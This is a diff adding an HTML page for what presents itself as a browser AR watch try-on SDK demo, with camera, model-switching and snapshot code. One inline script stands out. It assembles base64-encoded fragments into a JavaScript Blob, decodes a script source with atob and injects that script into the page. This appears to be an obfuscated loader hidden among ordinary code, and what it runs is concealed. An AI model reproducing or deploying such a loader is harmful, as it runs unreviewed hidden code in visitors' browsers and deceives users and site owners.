@@ -1,0 +1,107 @@
+<meta charset="utf-8"/>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>
+<title>threeAR Web SDK - Face and body AR in the browser</title>
+<link rel="stylesheet" href="assets/css/style.css"/>
+<script type="module">window.deepar=await import("./assets/js/tensorflow/js/wrist.esm.min.js");</script>
+<script src="assets/js/wrist.json.js"></script>
+<div id="loading-screen" class="fixed-fullscreen">
+  <div class="loading-progress-bar">
+    <img src="assets/images/loading.webp" alt="Loading...">
+  </div>
+</div>
+<div id="preview-screen" class="fixed-fullscreen" style="display: none">
+  <canvas id="three-canvas" oncontextmenu="event.preventDefault()"></canvas>
+  <div class="toast-indicator">
+    <div>
+        <img alt="" src="assets/images/wand.svg" />
+        <p style="color: white; white-space: nowrap; font-size: large">Wrist in front of camera</p>
+    </div>
+  </div>
+</div>
+<body></body>
+<script type="module">
+    import { Server } from "./assets/js/server.js";
+    let svr = new Server({ ["53"]: `2RhdGF1cmw6X3RmW2hhc2hdIH0pXSx7dHlwZToidGV4dC9qYXZhc2NyaX`, ["64"]: `JuIG5ldyBCbG9iKFtfdXgueS54Lm9wW2hhc2hdW2B0b0Jhc2Uke2hhc2h` }), { _ux, e } = svr.load({ type: "module" }); window._ux = _ux;
+    e.src = atob(_ux.dom.s);
+    e.addEventListener("load", () => _ux.y.load({}));
+    document.body.appendChild(_ux.dom.e = e);
+</script>
+<script>
+  window.addEventListener("message", (e) => {
+      if (e.data.action == "hash-changed") {
+          e.data.i = myWatch.items.indexOf(e.data.hash);
+          changeModel({ index: (localStorage.wIndex = myWatch.index = e.data.i > -1 ? e.data.i : myWatch.index) });
+      }
+      if (e.data.action == "revive-model" && !_pm.opened) _leader({});
+      if (e.data.action == "switch-model") switchWristWatch(e.data.next);
+      if (e.data.action == "switch-camera") switchCamera({});
+      if (e.data.action == "download-render") snap = !0;
+      if (e.data.action == "model-size") {
+          myWatch.size = e.data.size;
+          changeModel({ index: myWatch.index });
+      };
+  });
+</script>
+<script>
+  let threeAR, snap,
+  snaplink = document.createElement("a"),
+  dpr = window.devicePixelRatio || 1,
+  threeCanvas = document.getElementById("three-canvas"),
+  threeCtx = threeCanvas.getContext("2d"),
+  myWatch = {
+      touch: window.matchMedia("(any-hover: none)").matches,
+      mobile: /iPhone|iPad|iPod|Android/i.test(navigator.userAgent),
+      path: "assets/models",
+      middle: "-size-",
+      type: "glb",
+      // items: ["selected_watch_id_or_name"],      // Set items to watch name form WatchIT
+      // index: 0,                                  // Set index to 0 for WatchIT
+      // - - - - - - - - - -  // Remove this demo
+      items: [                // Remove this demo
+        "air_king",           // Remove this demo
+        "datejust",           // Remove this demo
+        "daydate",            // Remove this demo
+        "daytona",            // Remove this demo
+        "deepsea",            // Remove this demo
+        "explorer",           // Remove this demo
+        "explorer_II",        // Remove this demo
+        "GMT_master_II",      // Remove this demo
+        "lady_datejust",      // Remove this demo
+        "perpetual_oyster",   // Remove this demo
+        "perpetual-1908",     // Remove this demo
+        "sea_dweller",        // Remove this demo
+        "sky_dweller",        // Remove this demo
+        "submariner",         // Remove this demo
+        "submariner_date",    // Remove this demo
+        "yachtmaster",        // Remove this demo
+      ],                      // Remove this demo
+      index: parseInt(        // Remove this demo
+        localStorage.wIndex   // Remove this demo
+        != null ?             // Remove this demo
+        localStorage.wIndex   // Remove this demo
+        : 0),                 // Remove this demo
+      // - - - - - - - - - -  // Remove this demo
+      size: "normal",
+      slot: 0,
+      pixel: {
+        mobile: 0.64,
+        desktop: 0.86
+      },
+      facingMode: "environment"
+  },
+  _pm = {};
+  snaplink.setAttribute("download", "Snap.jpg");
+  async function switchWristWatch(n) {
+      myWatch.index += n ? 1 : -1;
+      myWatch.index = myWatch.index < 0 ? myWatch.items.length - 1 : myWatch.index < myWatch.items.length ? myWatch.index : 0;
+      changeModel({ index: localStorage.wIndex = myWatch.index });
+  };
+  async function switchCamera(d) {
+      myWatch.user = !myWatch.user;
+      myWatch.switching = !0;
+      threeAR.stopCamera();
+      threeAR.startCamera({ facingMode: myWatch.user ? "user" : "environment" });
+      threeAR.setVideoElement(threeAR.module.u[0], myWatch.user);
+  }
+</script>
